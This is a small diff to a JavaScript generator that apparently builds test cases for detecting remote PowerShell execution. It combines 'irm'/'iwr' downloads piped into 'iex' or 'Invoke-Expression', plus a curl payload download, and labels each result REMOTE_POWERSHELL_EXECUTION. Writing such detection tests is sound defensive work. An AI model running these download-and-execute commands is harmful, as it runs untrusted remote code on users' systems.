@@ -55,7 +55,7 @@ for(const [d,down] of [['curl','curl -fsSL '+URL+' -o payload'],
 for(const shell of ['pwsh','powershell']){
  for(const fetch of ['irm','iwr','Invoke-RestMethod','Invoke-WebRequest']){
   for(const sink of ['iex','Invoke-Expression']){
-   for(const prefix of ['',' # comment\n']){
+   for(const prefix of ['','# comment\n']){
     record('PWSH-'+shell+'-'+fetch+'-'+sink+'-'+prefix.length,
      prefix+fetch+' '+URL+' | '+sink,'REMOTE_POWERSHELL_EXECUTION',shell);
    }
